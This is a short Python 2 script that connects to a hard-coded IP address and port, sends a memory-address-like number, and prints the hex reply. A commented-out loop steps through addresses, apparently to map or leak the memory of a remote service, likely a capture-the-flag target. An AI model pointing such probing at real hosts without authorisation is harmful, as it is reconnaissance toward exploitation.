import socket
#timeout = 5
#socket.setdefaulttimeout(timeout)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("146.148.79.13",55173))

#for pos in range( 168):
#	ent = pos * 0x10000 + 0x1000
#	print '%d' % ent
#	s.send ('%d' % ent)
#	try:
#		str = s.recv(1024)
#		print str.encode("hex")
#		print pos

#	except:
#		print pos,"timeout"
		#pass

s.send("4206592\r\n")
str = s.recv(1024)
print str.encode("hex")
